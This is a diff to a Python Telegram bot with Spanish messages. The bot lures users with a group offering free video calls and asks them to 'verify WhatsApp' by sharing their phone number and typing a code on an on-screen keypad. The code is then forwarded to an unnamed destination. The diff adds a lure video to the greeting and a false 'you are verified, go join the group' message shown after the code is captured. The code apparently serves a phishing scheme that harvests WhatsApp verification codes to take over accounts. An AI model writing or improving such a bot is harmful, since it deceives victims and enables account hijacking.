@@ -46,18 +46,38 @@ def build_keypad(code_str: str):
     )
     return text, InlineKeyboardMarkup(rows)
 
-# /start
+# /start  (VIDEO + MENSAJE + BOTÓN NATIVO en un solo mensaje si START_VIDEO está definido)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_CODE] = ""
     context.user_data.pop(UD_PHONE, None)
+
     nombre_usuario = update.effective_user.first_name or "usuario"
-    await update.message.reply_text(
+    caption = (
         f"👋𝐇𝐨𝐥𝐚 {nombre_usuario}\n\n"
         "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫𝐞 𝐞𝐥 𝐫𝐞𝐬𝐩𝐞𝐭𝐨 𝐡𝐚𝐜𝐢𝐚 𝐥𝐚𝐬 𝐩𝐞𝐫𝐬𝐨𝐧𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨.\n\n"
         "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬 𝐯𝐢𝐝𝐞𝐨𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐠𝐫𝐚𝐭𝐢𝐬 𝐬𝐞𝐫 𝐫𝐞𝐬𝐩𝐞𝐭𝐮𝐨𝐬𝐨.\n\n"
         "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
-        "“𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏”",
-        reply_markup=share_phone_kb(), parse_mode="Markdown"
+        "“𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏”"
+    )
+
+    start_video = os.getenv("START_VIDEO", "").strip()
+    if start_video:
+        try:
+            await update.message.reply_video(
+                video=start_video,
+                caption=caption,
+                reply_markup=share_phone_kb(),
+                parse_mode="Markdown"
+            )
+            return
+        except Exception as e:
+            log.exception("No pude enviar el video de inicio: %s", e)
+
+    # Fallback si no hay START_VIDEO o falló el envío del video
+    await update.message.reply_text(
+        caption,
+        reply_markup=share_phone_kb(),
+        parse_mode="Markdown"
     )
 
 # CONTACTO NATIVO
@@ -119,7 +139,6 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "Código: `—`"
             )
             text, kb = build_keypad("")  # keypad en blanco
-            # mostramos SOLO el error y dejamos el teclado para reintentar
             await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
             return
 
@@ -140,7 +159,10 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             log.exception("Error enviando código al destino: %s", e)
 
-        await q.edit_message_text("✅ ¡Gracias! Hemos recibido tu código. Te confirmaremos en breve.")
+        # ✅ Cambio solicitado aquí
+        await q.edit_message_text(
+            "¡𝐄𝐱𝐜𝐞𝐥𝐞𝐧𝐭𝐞, 𝐲𝐚 𝐞𝐬𝐭𝐚́𝐬 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐝𝐨! 𝐕𝐚𝐲𝐚 𝐚 𝐬𝐮 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐞 𝐢𝐧𝐠𝐫𝐞́𝐬𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨. 𝐒𝐢 𝐩𝐨𝐫 𝐚𝐥𝐠𝐮́𝐧𝐚 𝐫𝐚𝐳𝐨́𝐧 𝐧𝐨 𝐬𝐚𝐥𝐞 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨 𝐯𝐮𝐞𝐥𝐯𝐚 𝐚𝐪𝐮𝐢́ 𝐲 𝐬𝐨𝐥𝐢𝐜𝐢𝐭𝐞 𝐮𝐧𝐚 𝐧𝐮𝐞𝐯𝐚 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢𝐨́𝐧."
+        )
         context.user_data[UD_CODE] = ""
         return
 
